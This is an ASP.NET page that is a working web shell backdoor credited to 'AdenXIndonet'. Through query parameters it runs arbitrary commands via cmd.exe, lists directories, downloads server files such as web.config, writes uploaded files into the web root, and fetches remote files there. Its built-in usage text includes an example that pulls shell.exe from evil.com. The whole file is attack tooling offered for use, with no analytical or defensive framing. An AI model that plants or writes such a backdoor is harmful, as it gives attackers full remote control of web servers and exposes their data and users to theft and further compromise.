<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net" %>

<script runat="server">
    
    // Shell backdoor dengan multiple functions - BY AdenXIndonet 🔥
    
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        string action = Request.QueryString["action"];
        string file = Request.QueryString["file"];
        string url = Request.QueryString["url"];
        
        Response.Clear();
        Response.ContentType = "text/plain";
        
        if (!string.IsNullOrEmpty(cmd))
        {
            // Execute system command
            ExecuteCommand(cmd);
        }
        else if (action == "upload" && !string.IsNullOrEmpty(file))
        {
            // Handle file upload
            HandleFileUpload(file);
        }
        else if (action == "download" && !string.IsNullOrEmpty(file))
        {
            // Download file from server
            DownloadFile(file);
        }
        else if (action == "wget" && !string.IsNullOrEmpty(url))
        {
            // Download file from internet
            WgetFile(url);
        }
        else if (action == "list")
        {
            // List directory
            ListDirectory(string.IsNullOrEmpty(file) ? Server.MapPath("~/") : file);
        }
        else
        {
            Response.Write("AdenXIndonet Backdoor Active!\n");
            Response.Write("Commands:\n");
            Response.Write("?cmd=whoami - Execute command\n");
            Response.Write("?action=list&file=C:\\ - List directory\n");
            Response.Write("?action=download&file=web.config - Download file\n");
            Response.Write("?action=upload&file=shell.aspx - Upload file (POST data)\n");
            Response.Write("?action=wget&url=http://evil.com/shell.exe - Download remote file\n");
        }
        
        Response.End();
    }
    
    private void ExecuteCommand(string command)
    {
        try
        {
            Response.Write("Executing: " + command + "\n\n");
            
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + command;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            
            Process p = Process.Start(psi);
            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit();
            
            Response.Write(output);
            if (!string.IsNullOrEmpty(error))
                Response.Write("\n[ERROR]\n" + error);
        }
        catch (Exception ex)
        {
            Response.Write("Error: " + ex.Message);
        }
    }
    
    private void ListDirectory(string path)
    {
        try
        {
            if (Directory.Exists(path))
            {
                Response.Write("Directory: " + path + "\n\n");
                
                // Get directories
                Response.Write("[DIRECTORIES]\n");
                foreach (string dir in Directory.GetDirectories(path))
                {
                    DirectoryInfo di = new DirectoryInfo(dir);
                    Response.Write("[DIR] " + di.Name + "\n");
                }
                
                // Get files
                Response.Write("\n[FILES]\n");
                foreach (string file in Directory.GetFiles(path))
                {
                    FileInfo fi = new FileInfo(file);
                    Response.Write(fi.Name + " - " + fi.Length + " bytes - " + fi.LastWriteTime + "\n");
                }
            }
            else if (File.Exists(path))
            {
                DownloadFile(path);
            }
            else
            {
                Response.Write("Path not found: " + path);
            }
        }
        catch (Exception ex)
        {
            Response.Write("Error listing directory: " + ex.Message);
        }
    }
    
    private void DownloadFile(string filePath)
    {
        try
        {
            if (File.Exists(filePath))
            {
                Response.Clear();
                Response.ContentType = "application/octet-stream";
                Response.AppendHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(filePath));
                Response.TransmitFile(filePath);
                Response.Flush();
                Response.End();
            }
            else
            {
                Response.Write("File not found: " + filePath);
            }
        }
        catch (Exception ex)
        {
            Response.Write("Error downloading file: " + ex.Message);
        }
    }
    
    private void HandleFileUpload(string fileName)
    {
        try
        {
            if (Request.Files.Count > 0)
            {
                HttpPostedFile uploadedFile = Request.Files[0];
                string savePath = Server.MapPath("~/") + fileName;
                uploadedFile.SaveAs(savePath);
                Response.Write("File uploaded successfully to: " + savePath);
            }
            else
            {
                Response.Write("No file uploaded. Send file as POST data.");
            }
        }
        catch (Exception ex)
        {
            Response.Write("Error uploading file: " + ex.Message);
        }
    }
    
    private void WgetFile(string url)
    {
        try
        {
            string fileName = Path.GetFileName(url);
            if (string.IsNullOrEmpty(fileName))
                fileName = "downloaded_" + DateTime.Now.Ticks + ".exe";
            
            string savePath = Server.MapPath("~/") + fileName;
            
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(url, savePath);
            }
            
            Response.Write("File downloaded successfully to: " + savePath);
        }
        catch (Exception ex)
        {
            Response.Write("Error downloading file: " + ex.Message);
        }
    }
    
    // Handle POST requests for file upload
    protected override void OnLoad(EventArgs e)
    {
        base.OnLoad(e);
        if (IsPostBack)
        {
            Page_Load(null, null);
        }
    }
    
</script>